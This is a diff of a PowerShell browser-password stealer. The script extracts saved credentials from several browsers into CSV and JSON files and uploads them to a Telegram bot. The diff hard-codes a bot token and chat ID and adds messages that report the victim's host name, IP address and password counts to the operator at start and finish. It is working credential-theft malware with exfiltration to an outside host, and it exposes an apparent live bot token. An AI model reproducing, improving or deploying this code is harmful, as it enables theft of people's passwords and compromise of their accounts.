@@ -3,7 +3,7 @@
 
 param(
     [string]$TelegramBotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
-    [string]$TelegramChatID = "" # Leave empty to get updates from your bot
+    [string]$TelegramChatID = "2047893044"  # Your Chat ID
 )
 
 # Get system information for file naming
@@ -20,6 +20,7 @@ Write-Host "================================================" -ForegroundColor G
 Write-Host "Files will be saved as:" -ForegroundColor Yellow
 Write-Host "CSV: $CSVPath" -ForegroundColor Yellow
 Write-Host "JSON: $JSONPath" -ForegroundColor Yellow
+Write-Host "Telegram Chat ID: $TelegramChatID" -ForegroundColor Cyan
 
 # Browser paths configuration
 $browsers = @{
@@ -50,26 +51,11 @@ function Send-TelegramFile {
             return $false
         }
         
-        if (-not $TelegramChatID) {
-            Write-Host "Telegram Chat ID not specified. Getting updates to find chat ID..." -ForegroundColor Yellow
-            $updatesUrl = "https://api.telegram.org/bot$TelegramBotToken/getUpdates"
-            $updates = Invoke-RestMethod -Uri $updatesUrl -Method Get
-            if ($updates.ok -and $updates.result.Count -gt 0) {
-                $TelegramChatID = $updates.result[0].message.chat.id
-                Write-Host "Found Chat ID: $TelegramChatID" -ForegroundColor Green
-            } else {
-                Write-Host "Could not automatically get Chat ID. Please send a message to your bot first." -ForegroundColor Red
-                return $false
-            }
-        }
-        
         $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileFields = @{
-            chat_id = $TelegramChatID
-            caption = $Caption
-        }
-        
+        $fileContent = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
         $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
         $bodyLines = (
             "--$boundary",
             "Content-Disposition: form-data; name=`"chat_id`"",
@@ -83,22 +69,50 @@ function Send-TelegramFile {
             "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
             "Content-Type: application/octet-stream",
             "",
-            [System.Text.Encoding]::UTF8.GetString($fileBytes),
+            $fileContent,
             "--$boundary--"
-        ) -join "`r`n"
-        
+        ) -join $LF
+
         $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
         $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
         
         if ($response.ok) {
-            Write-Host "File sent to Telegram successfully: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
+            Write-Host "✅ File sent to Telegram successfully: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
             return $true
         } else {
-            Write-Host "Telegram API error: $($response.description)" -ForegroundColor Red
+            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
             return $false
         }
     } catch {
-        Write-Host "Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "❌ Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# Function to send message to Telegram
+function Send-TelegramMessage {
+    param(
+        [string]$Message
+    )
+    
+    try {
+        $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
+        $body = @{
+            chat_id = $TelegramChatID
+            text = $Message
+        }
+        
+        $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
+        
+        if ($response.ok) {
+            Write-Host "✅ Message sent to Telegram" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
+            return $false
+        }
+    } catch {
+        Write-Host "❌ Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
@@ -343,14 +357,18 @@ FROM logins;
 }
 
 # Main execution
+Write-Host "Starting multi-browser encrypted password extraction..." -ForegroundColor Green
+
+# Send start notification to Telegram
+$startMessage = "🔍 Starting browser password extraction on: $systemName ($ipAddress) at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+Send-TelegramMessage -Message $startMessage | Out-Null
+
 if (-not (Test-Path ".\sqlite3.exe")) {
     if (-not (Install-SQLiteIfNeeded)) {
         Write-Host "SQLite3 is required. Exiting." -ForegroundColor Red
         exit 1
     }
 }
-
-Write-Host "Starting multi-browser encrypted password extraction..." -ForegroundColor Green
 
 $allSummaryData = @()
 $allDetailedData = @()
@@ -414,13 +432,22 @@ if ($allSummaryData.Count -gt 0) {
     # Send files to Telegram
     Write-Host "`nSending files to Telegram..." -ForegroundColor Yellow
     
-    $csvSent = Send-TelegramFile -FilePath $CSVPath -Caption "Browser Password Extraction - CSV Summary - $systemName ($ipAddress)"
-    $jsonSent = Send-TelegramFile -FilePath $JSONPath -Caption "Browser Password Extraction - JSON Data - $systemName ($ipAddress)"
+    $csvCaption = "📊 Browser Password Extraction - CSV Summary`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)"
+    $jsonCaption = "🔐 Browser Password Extraction - JSON Data`nSystem: $systemName`nIP: $ipAddress`nEntries: $($allSummaryData.Count)"
+    
+    $csvSent = Send-TelegramFile -FilePath $CSVPath -Caption $csvCaption
+    $jsonSent = Send-TelegramFile -FilePath $JSONPath -Caption $jsonCaption
     
     if ($csvSent -and $jsonSent) {
-        Write-Host "Both files sent to Telegram successfully!" -ForegroundColor Green
+        Write-Host "✅ Both files sent to Telegram successfully!" -ForegroundColor Green
+        # Send success message
+        $successMessage = "✅ Password extraction completed!`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nFiles sent successfully!"
+        Send-TelegramMessage -Message $successMessage | Out-Null
     } else {
-        Write-Host "Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
+        Write-Host "❌ Some files failed to send to Telegram. They are saved locally." -ForegroundColor Yellow
+        # Send error message
+        $errorMessage = "⚠️ Password extraction completed with some errors.`nSystem: $systemName`nIP: $ipAddress`nTotal entries: $($allSummaryData.Count)`nCheck local files for details."
+        Send-TelegramMessage -Message $errorMessage | Out-Null
     }
     
     # Show summary by browser
@@ -450,6 +477,9 @@ if ($allSummaryData.Count -gt 0) {
     
 } else {
     Write-Host "No encrypted passwords found in any browser." -ForegroundColor Yellow
+    # Send empty result message
+    $emptyMessage = "❌ No passwords found in any browser.`nSystem: $systemName`nIP: $ipAddress`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    Send-TelegramMessage -Message $emptyMessage | Out-Null
 }
 
 Write-Host "`nMulti-browser encrypted data extraction completed." -ForegroundColor Green
